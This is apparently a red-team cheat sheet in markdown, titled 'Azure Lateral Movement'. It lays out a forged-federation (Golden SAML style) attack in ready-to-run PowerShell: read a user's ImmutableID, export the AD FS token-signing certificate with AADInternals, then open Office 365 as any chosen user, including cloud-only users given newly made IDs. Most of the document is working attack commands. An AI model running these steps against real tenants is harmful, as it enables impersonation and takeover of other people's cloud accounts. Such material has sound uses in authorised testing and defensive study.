<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Azure Lateral Movement

* Federation
	* On-Prem to Cloud
		* From any on-prem machine as a normal domain user, get the ImmutableID of the target user
			* `[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())`
		* On AD FS server (as administrator)
			* `Get-AdfsProperties | select identifier`
		* Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
			* `Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri`
		* Note: When setting up the AD FS using Azure AD Connect, there is a difference between IssuerURI on ADFS server and Azure AD. Use the one from AzureAD
		* With DA privileges on-prem we can extract the ADFS token signing certificate from the ADFS server using AADInternals
			* `Export-AADIntADFSSigningCertificate`
		* Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified
			* `Open-AADIntOffice365Portal -ImmutableID ID-HERE -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose`
		* With DA prvileges on-prem, it is possible to create ImmutableID of cloud only users
			* Create a realistic ImmutableID
				* `[System.Convert]::ToBase64String((New-Guid).tobytearray())`
			* Using AADInternals, export the token signing certificate
				* `Export-AADIntADFSSigningCertificate`
			* Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified
				* `Open-AADIntOffice365Portal -ImmutableID ID-HERE -Issuer http://deffin.com/adfs/services/trust -PfxFileName c:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose`